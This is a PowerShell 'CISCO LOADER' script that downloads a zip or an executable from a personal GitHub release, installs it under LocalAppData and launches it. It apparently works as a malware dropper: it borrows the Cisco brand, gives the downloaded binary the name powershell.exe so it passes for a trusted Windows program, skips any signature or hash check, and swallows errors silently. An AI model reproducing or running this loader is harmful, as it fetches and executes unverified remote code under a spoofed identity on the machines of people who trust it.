$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

try {
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    $OutputEncoding = [System.Text.Encoding]::UTF8
}
catch {
}

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
}
catch {
}

# ==========================================================
# CISCO PURE GREEN LOADER
# Repo    : https://github.com/Wxyuz/CISCO
# Release : v1.0.0
# Primary : CISCO.zip
# Fallback: powershell.exe
# ==========================================================

$AppTitle = "CISCO LOADER"

$RepoOwner = "Wxyuz"
$RepoName = "CISCO"
$TagName = "v1.0.0"

$PrimaryAssetName = "CISCO.zip"
$FallbackAssetName = "powershell.exe"
$GuiExeName = "powershell.exe"

$PrimaryDownloadUrl = "https://github.com/$RepoOwner/$RepoName/releases/download/$TagName/$PrimaryAssetName"
$FallbackDownloadUrl = "https://github.com/$RepoOwner/$RepoName/releases/download/$TagName/$FallbackAssetName"

function Get-SafeLocalAppData {
    if (![string]::IsNullOrWhiteSpace($env:LOCALAPPDATA)) {
        return $env:LOCALAPPDATA
    }

    if (![string]::IsNullOrWhiteSpace($env:USERPROFILE)) {
        return (Join-Path $env:USERPROFILE "AppData\Local")
    }

    return $PWD.Path
}

$InstallRoot = Join-Path (Get-SafeLocalAppData) "Wxyuz"
$InstallDir = Join-Path $InstallRoot "CISCO"
$GuiPath = Join-Path $InstallDir $GuiExeName
$TempDir = Join-Path $InstallRoot "CISCO_TEMP"
$TempZip = Join-Path $TempDir $PrimaryAssetName
$TempExe = Join-Path $TempDir $FallbackAssetName

$LoaderMutexName = "Global\Wxyuz_CISCO_LOADER_MUTEX_v1_0_0"
$GuiMutexFile = Join-Path $InstallDir "gui.lock"

$LoaderMutex = $null
$LoaderMutexCreated = $false

function Initialize-Console {
    try {
        Clear-Host
    }
    catch {
    }

    try {
        $Host.UI.RawUI.WindowTitle = $AppTitle
    }
    catch {
    }

    try {
        [Console]::CursorVisible = $false
    }
    catch {
    }

    try {
        [Console]::ForegroundColor = [ConsoleColor]::Green
    }
    catch {
    }

    try {
        $RawUi = $Host.UI.RawUI
        $BufferSize = $RawUi.BufferSize

        if ($BufferSize.Width -lt 90) {
            $BufferSize.Width = 90
            $RawUi.BufferSize = $BufferSize
        }
    }
    catch {
    }

    Show-GreenBar -Percent 0
}

function Restore-Console {
    try {
        [Console]::CursorVisible = $true
    }
    catch {
    }

    try {
        [Console]::ResetColor()
    }
    catch {
    }
}

function Close-LoaderWindow {
    try {
        Restore-Console
    }
    catch {
    }

    try {
        Clear-Host
    }
    catch {
    }

    exit 0
}

function Show-GreenBar {
    param(
        [int]$Percent
    )

    if ($Percent -lt 0) {
        $Percent = 0
    }

    if ($Percent -gt 100) {
        $Percent = 100
    }

    $BarWidth = 72
    $Filled = [int](($Percent * $BarWidth) / 100)

    if ($Filled -lt 0) {
        $Filled = 0
    }

    if ($Filled -gt $BarWidth) {
        $Filled = $BarWidth
    }

    $Empty = $BarWidth - $Filled
    $Block = [string][char]0x2588
    $Space = " "
    $Bar = "[" + ($Block * $Filled) + ($Space * $Empty) + "]"

    try {
        [Console]::SetCursorPosition(0, 0)
    }
    catch {
    }

    try {
        [Console]::ForegroundColor = [ConsoleColor]::Green
    }
    catch {
    }

    try {
        [Console]::Write($Bar.PadRight(90))
    }
    catch {
    }
}

function Show-ErrorPopup {
    param(
        [string]$Message
    )

    try {
        Restore-Console
    }
    catch {
    }

    try {
        Clear-Host
    }
    catch {
    }

    try {
        Add-Type -AssemblyName System.Windows.Forms
        [void][System.Windows.Forms.MessageBox]::Show(
            $Message,
            "CISCO LOADER ERROR",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
    catch {
        Write-Host ""
        Write-Host "ERROR"
        Write-Host ""
        Write-Host $Message
        Write-Host ""
        Write-Host "Press Enter to close..."
        [void][System.Console]::ReadLine()
    }
}

function Ensure-Folder {
    param(
        [string]$Path
    )

    if (!(Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Path $Path -Force | Out-Null
    }
}

function Normalize-PathSafe {
    param(
        [string]$Path
    )

    try {
        return ([System.IO.Path]::GetFullPath($Path).TrimEnd('\'))
    }
    catch {
        return $Path
    }
}

function Test-WindowsExe {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if (!(Test-Path -LiteralPath $Path)) {
        return $false
    }

    $Stream = $null

    try {
        $Stream = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite
        )

        if ($Stream.Length -lt 2) {
            return $false
        }

        $Buffer = New-Object byte[] 2
        [void]$Stream.Read($Buffer, 0, 2)

        if ($Buffer[0] -eq 0x4D -and $Buffer[1] -eq 0x5A) {
            return $true
        }

        return $false
    }
    catch {
        return $false
    }
    finally {
        if ($null -ne $Stream) {
            try {
                $Stream.Close()
            }
            catch {
            }
        }
    }
}

function Add-WindowTools {
    try {
        if (!("CISCO_WindowTools.Win32Window" -as [type])) {
            Add-Type @"
using System;
using System.Runtime.InteropServices;

namespace CISCO_WindowTools
{
    public static class Win32Window
    {
        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);
    }
}
"@
        }
    }
    catch {
    }
}

function Restore-AppWindow {
    param(
        [int]$ProcessId
    )

    try {
        Add-WindowTools

        $Process = Get-Process -Id $ProcessId -ErrorAction Stop

        if ($Process.MainWindowHandle -ne 0) {
            [void][CISCO_WindowTools.Win32Window]::ShowWindowAsync($Process.MainWindowHandle, 9)
            [void][CISCO_WindowTools.Win32Window]::SetForegroundWindow($Process.MainWindowHandle)
            return $true
        }
    }
    catch {
    }

    return $false
}

function Get-RunningGuiProcesses {
    $TargetPath = Normalize-PathSafe $GuiPath
    $Result = New-Object System.Collections.ArrayList

    try {
        $Processes = Get-CimInstance Win32_Process -ErrorAction Stop

        foreach ($ProcessItem in $Processes) {
            if ($null -ne $ProcessItem.ExecutablePath) {
                $ProcessPath = Normalize-PathSafe $ProcessItem.ExecutablePath

                if ($ProcessPath -ieq $TargetPath) {
                    [void]$Result.Add($ProcessItem)
                }
            }
        }
    }
    catch {
        try {
            $Processes = Get-WmiObject Win32_Process -ErrorAction Stop

            foreach ($ProcessItem in $Processes) {
                if ($null -ne $ProcessItem.ExecutablePath) {
                    $ProcessPath = Normalize-PathSafe $ProcessItem.ExecutablePath

                    if ($ProcessPath -ieq $TargetPath) {
                        [void]$Result.Add($ProcessItem)
                    }
                }
            }
        }
        catch {
        }
    }

    foreach ($Item in $Result) {
        Write-Output $Item
    }
}

function Test-AnyRunningGui {
    $Found = $false

    foreach ($Item in Get-RunningGuiProcesses) {
        $Found = $true
    }

    return $Found
}

function Restore-RunningGui {
    foreach ($Item in Get-RunningGuiProcesses) {
        try {
            [void](Restore-AppWindow -ProcessId ([int]$Item.ProcessId))
        }
        catch {
        }
    }
}

function Remove-PathSafe {
    param(
        [string]$Path
    )

    if (Test-Path -LiteralPath $Path) {
        try {
            Remove-Item -LiteralPath $Path -Recurse -Force
        }
        catch {
        }
    }
}

function Test-UrlExists {
    param(
        [string]$Url
    )

    $Request = $null
    $Response = $null

    try {
        $Request = [System.Net.HttpWebRequest]::Create($Url)
        $Request.Method = "HEAD"
        $Request.AllowAutoRedirect = $true
        $Request.MaximumAutomaticRedirections = 10
        $Request.UserAgent = "Mozilla/5.0 CISCO-Loader"
        $Request.Timeout = 15000
        $Response = $Request.GetResponse()
        return $true
    }
    catch {
        return $false
    }
    finally {
        if ($null -ne $Response) {
            try {
                $Response.Close()
            }
            catch {
            }
        }
    }
}

function Invoke-DownloadFileWithGreenBar {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,

        [Parameter(Mandatory = $true)]
        [string]$Destination,

        [int]$StartPercent,

        [int]$EndPercent
    )

    $Request = $null
    $Response = $null
    $InputStream = $null
    $OutputStream = $null

    if ($EndPercent -le $StartPercent) {
        $EndPercent = $StartPercent + 1
    }

    try {
        Show-GreenBar -Percent $StartPercent

        $Request = [System.Net.HttpWebRequest]::Create($Url)
        $Request.Method = "GET"
        $Request.AllowAutoRedirect = $true
        $Request.MaximumAutomaticRedirections = 10
        $Request.UserAgent = "Mozilla/5.0 CISCO-Loader"
        $Request.Timeout = 60000
        $Request.ReadWriteTimeout = 60000
        $Request.KeepAlive = $false

        $Response = $Request.GetResponse()
        $InputStream = $Response.GetResponseStream()

        $OutputStream = [System.IO.File]::Open(
            $Destination,
            [System.IO.FileMode]::Create,
            [System.IO.FileAccess]::Write,
            [System.IO.FileShare]::None
        )

        $TotalBytes = [Int64]$Response.ContentLength
        $TotalRead = [Int64]0
        $Buffer = New-Object byte[] 65536
        $UnknownPercent = $StartPercent

        while ($true) {
            $Read = $InputStream.Read($Buffer, 0, $Buffer.Length)

            if ($Read -le 0) {
                break
            }

            $OutputStream.Write($Buffer, 0, $Read)
            $TotalRead += $Read

            if ($TotalBytes -gt 0) {
                $LocalPercent = [int](($TotalRead * 100) / $TotalBytes)

                if ($LocalPercent -lt 0) {
                    $LocalPercent = 0
                }

                if ($LocalPercent -gt 100) {
                    $LocalPercent = 100
                }

                $MappedPercent = $StartPercent + [int](($LocalPercent * ($EndPercent - $StartPercent)) / 100)
                Show-GreenBar -Percent $MappedPercent
            }
            else {
                $UnknownPercent += 1

                if ($UnknownPercent -gt ($EndPercent - 1)) {
                    $UnknownPercent = $EndPercent - 1
                }

                Show-GreenBar -Percent $UnknownPercent
            }
        }

        Show-GreenBar -Percent $EndPercent

        if (!(Test-Path -LiteralPath $Destination)) {
            throw "Download failed. File not created."
        }

        $DownloadedItem = Get-Item -LiteralPath $Destination

        if ($DownloadedItem.Length -le 0) {
            throw "Download failed. File size is 0 bytes."
        }
    }
    catch [System.Net.WebException] {
        $Message = $_.Exception.Message

        try {
            if ($null -ne $_.Exception.Response) {
                $StatusCode = [int]$_.Exception.Response.StatusCode
                $StatusDescription = $_.Exception.Response.StatusDescription
                $Message = "HTTP $StatusCode $StatusDescription - $Message"
            }
        }
        catch {
        }

        throw $Message
    }
    finally {
        if ($null -ne $OutputStream) {
            try {
                $OutputStream.Close()
            }
            catch {
            }
        }

        if ($null -ne $InputStream) {
            try {
                $InputStream.Close()
            }
            catch {
            }
        }

        if ($null -ne $Response) {
            try {
                $Response.Close()
            }
            catch {
            }
        }
    }
}

function Expand-ZipFileSafe {
    param(
        [string]$ZipPath,
        [string]$Destination
    )

    Show-GreenBar -Percent 82

    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
    }
    catch {
    }

    Ensure-Folder -Path $Destination

    try {
        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipPath, $Destination)
    }
    catch {
        try {
            Expand-Archive -LiteralPath $ZipPath -DestinationPath $Destination -Force
        }
        catch {
            throw $_
        }
    }

    Show-GreenBar -Percent 92
}

function Install-FromZip {
    Ensure-Folder -Path $InstallRoot
    Remove-PathSafe -Path $TempDir
    Ensure-Folder -Path $TempDir

    Invoke-DownloadFileWithGreenBar `
        -Url $PrimaryDownloadUrl `
        -Destination $TempZip `
        -StartPercent 1 `
        -EndPercent 80

    if (!(Test-Path -LiteralPath $TempZip)) {
        throw "Zip file not found after download."
    }

    if (Test-AnyRunningGui) {
        Restore-RunningGui
        Close-LoaderWindow
    }

    Remove-PathSafe -Path $InstallDir
    Ensure-Folder -Path $InstallDir

    Expand-ZipFileSafe -ZipPath $TempZip -Destination $InstallDir

    if (!(Test-Path -LiteralPath $GuiPath)) {
        throw "GUI EXE not found in extracted zip: $GuiExeName"
    }

    if (!(Test-WindowsExe -Path $GuiPath)) {
        throw "Extracted GUI is not a valid Windows EXE."
    }

    Remove-PathSafe -Path $TempDir
    Show-GreenBar -Percent 96
}

function Install-FromSingleExe {
    Ensure-Folder -Path $InstallRoot
    Remove-PathSafe -Path $TempDir
    Ensure-Folder -Path $TempDir
    Ensure-Folder -Path $InstallDir

    Invoke-DownloadFileWithGreenBar `
        -Url $FallbackDownloadUrl `
        -Destination $TempExe `
        -StartPercent 1 `
        -EndPercent 88

    if (!(Test-Path -LiteralPath $TempExe)) {
        throw "EXE file not found after download."
    }

    if (!(Test-WindowsExe -Path $TempExe)) {
        throw "Downloaded file is not a valid Windows EXE."
    }

    if (Test-AnyRunningGui) {
        Restore-RunningGui
        Close-LoaderWindow
    }

    if (Test-Path -LiteralPath $GuiPath) {
        try {
            Remove-Item -LiteralPath $GuiPath -Force
        }
        catch {
            throw "Cannot replace old GUI because it is still running or locked."
        }
    }

    Move-Item -LiteralPath $TempExe -Destination $GuiPath -Force

    if (!(Test-Path -LiteralPath $GuiPath)) {
        throw "Final GUI EXE not found."
    }

    if (!(Test-WindowsExe -Path $GuiPath)) {
        throw "Final GUI is not a valid Windows EXE."
    }

    Remove-PathSafe -Path $TempDir
    Show-GreenBar -Percent 96
}

function Install-GuiFiles {
    if (Test-AnyRunningGui) {
        Restore-RunningGui
        Close-LoaderWindow
    }

    if (Test-UrlExists -Url $PrimaryDownloadUrl) {
        Install-FromZip
    }
    else {
        Install-FromSingleExe
    }
}

function Start-GuiOnce {
    if (Test-AnyRunningGui) {
        Restore-RunningGui
        return
    }

    if (!(Test-Path -LiteralPath $GuiPath)) {
        throw "GUI EXE not found."
    }

    if (!(Test-WindowsExe -Path $GuiPath)) {
        throw "GUI file is not a valid Windows EXE."
    }

    try {
        Set-Content -LiteralPath $GuiMutexFile -Value ([DateTime]::Now.ToString("yyyy-MM-dd HH:mm:ss")) -Force
    }
    catch {
    }

    $StartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $StartInfo.FileName = $GuiPath
    $StartInfo.WorkingDirectory = $InstallDir
    $StartInfo.UseShellExecute = $true
    $StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal

    $Process = [System.Diagnostics.Process]::Start($StartInfo)

    Start-Sleep -Seconds 2

    if ($null -eq $Process) {
        throw "GUI process failed to start."
    }

    try {
        $Process.Refresh()

        if ($Process.HasExited) {
            throw "GUI opened and closed immediately. ExitCode: $($Process.ExitCode)"
        }
    }
    catch {
        throw $_
    }

    Show-GreenBar -Percent 100
}

try {
    Initialize-Console

    $LoaderMutex = New-Object System.Threading.Mutex($true, $LoaderMutexName, [ref]$LoaderMutexCreated)

    if (-not $LoaderMutexCreated) {
        if (Test-AnyRunningGui) {
            Restore-RunningGui
        }

        Close-LoaderWindow
    }

    if (Test-AnyRunningGui) {
        Restore-RunningGui
        Close-LoaderWindow
    }

    Install-GuiFiles
    Start-GuiOnce
    Start-Sleep -Milliseconds 350
    Close-LoaderWindow
}
catch {
    Show-ErrorPopup -Message $_.Exception.Message
}
finally {
    if ($null -ne $LoaderMutex) {
        try {
            if ($LoaderMutexCreated) {
                $LoaderMutex.ReleaseMutex()
            }

            $LoaderMutex.Dispose()
        }
        catch {
        }
    }

    Restore-Console
}
